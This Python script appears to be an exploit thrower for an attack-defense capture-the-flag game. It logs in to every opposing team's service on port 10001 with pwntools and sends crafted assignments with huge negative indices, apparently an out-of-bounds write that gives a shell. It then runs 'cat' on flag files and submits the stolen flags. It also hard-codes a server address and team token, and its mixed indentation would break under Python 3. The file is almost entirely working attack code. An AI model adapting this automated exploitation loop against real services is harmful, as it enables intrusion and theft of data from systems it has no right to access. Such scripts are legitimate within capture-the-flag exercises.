#!/usr/bin/env python3

import swpag_client
import pwn
import subprocess

URL = "52.52.83.248" #CHANGE THIS
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "ndiVzdmIxXjyyXbRbVUj"#CHANGE THIS

def module_name():
  return "exploit_thrower"

def module_help():
  return "Throw a designed exploit at all teams and save in\"./flag-submitter.txt\" file"

def module_usage():
  return "{0}".format(module_name())
  
  
def main():
	
	servicenumber = 1 #CHANGE THIS
	
	team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
	
	f = open("flag-submitter.txt","a")

	
	flag = []
	for target in team.get_targets(servicenumber):
		
		r = pwn.remote(target['hostname'], 10001)
		r.recvuntil("username:")
		r.send("sh\n")
		r.recvuntil("password:")
		r.send("pwned\n")
		r.recvuntil("work:")
		r.send("pwned\n")
		r.recvuntil("result")
		r.send("S\n")
		r.recvuntil("end\n")
		r.send("V0=V-8+0\n")
		r.send("V1=V0+10641\n")
		r.send("V2=V0+130\n")
		r.send("V-1073741792=V2+0\n")
		r.send("V-1073741791=V1+0\n")
		r.send("\n")
		
		r.send("cat /home/chall/service/rw/"+target['flag_id'] + "_*")
		temp = r.read(4096).split("\n")[0]
		flag.append(temp)
		print(target['hostname'] + " " + temp + "\n")

		
		f.write(temp + "\n")
	f.close()
  	success = team.submit_flag(flag)
	print(success)
      	
  
  
if __name__ == "__main__":
	main()
